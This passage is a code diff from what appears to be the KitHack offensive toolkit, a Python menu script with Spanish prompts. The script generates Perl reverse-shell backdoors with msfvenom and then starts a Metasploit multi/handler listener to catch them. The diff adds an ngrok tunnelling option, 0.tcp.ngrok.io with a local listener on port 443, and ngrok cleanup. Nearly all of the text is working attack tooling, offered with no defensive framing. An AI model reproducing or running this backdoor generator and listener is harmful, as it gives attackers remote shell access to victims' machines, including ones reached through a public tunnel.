+				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.pl'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.pl".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()				
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()			
 				else:	
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()						
 			
 			elif pay == 2:
 				os.system('python lib/network.py')
-				LHOST = raw_input("\n\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
+				LHOST = raw_input("\n{0}SET LHOST: {1}".format(YELLOW, DEFAULT))
 				LPORT = raw_input("\n{0}SET LPORT: {1}".format(YELLOW, DEFAULT))
 				OUT = raw_input("\n{0}Ingrese un nombre para su archivo de salida: {1}".format(YELLOW, DEFAULT))
+				mainout = os.path.splitext(OUT)[0]
 				print("\n{0}[*] Generating backdoor...{1}".format(GREEN, DEFAULT))
 				time.sleep(4)
-				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl_ssl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, OUT))																				
+				os.system('service postgresql start && msfvenom -p cmd/unix/reverse_perl_ssl LHOST={0} LPORT={1} -f raw > output/{2}.pl'.format(LHOST, LPORT, mainout))																				
 				location = os.getcwd()
-				print("\033[1;32m")
-				if os.stat('output/{}.pl'.format(OUT)).st_size != 0:
-					print("Backdoor guardado en {0}/output/{1}.pl".format(location, OUT))	
-					if raw_input("\n¿Desea ejecutar msfconsole? (y/n)\n{0}KitHack >> {1}".format(RED, DEFAULT)).upper() != "Y":
-						os.system('service postgresql stop && clear')
+				if os.stat('output/{}.pl'.format(mainout)).st_size != 0:
+					print("\n{0}[✔] Done.\n{1}Backdoor guardado en {2}/output/{3}.pl".format(GREEN, DEFAULT, location, mainout))	
+					if raw_input("\n{0}[!] ¿Desea ejecutar msfconsole? (y/n)\n{1}KitHack >> {2}".format(GREEN, RED, DEFAULT)).upper() != "Y":
+						os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 						banner(), menu(), options()	
 					else:
-						os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
-						pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
-						os.system('service postgresql stop && clear')
-						banner(), menu(), options()	
+						while LHOST != "0.tcp.ngrok.io":
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST {0}; set LPORT {1}; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"'.format(LHOST, LPORT))
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
+						else:
+							os.system('xterm -T "KITHACK MSFCONSOLE" -fa monaco -fs 10 -bg black -e "msfconsole -x \'use exploit/multi/handler; set LHOST 127.0.0.1; set LPORT 443; set PAYLOAD cmd/unix/reverse_perl_ssl; exploit\'"')
+							pause("\n{}Presione cualquier tecla para continuar...".format(GREEN))
+							os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
+							banner(), menu(), options()	
 				else:
 					print("{0}[X] ERROR AL GENERAR SU BACKDOOR\n".format(RED))
 					time.sleep(3)
 					pause("{}Presione cualquier tecla para continuar...".format(GREEN))
-					os.system('service postgresql stop && clear')
+					os.system('service postgresql stop && kill -9 $(pgrep ngrok) && clear')
 					banner(), menu(), options()	
 
 			else:
@@ -2418,11 +3573,9 @@ def options():
 		os.system('clear')
 		banner(), menu(), options()
 
-
 if __name__ == "__main__":
 	check()
 	menu()
 	options()
 
 	
-
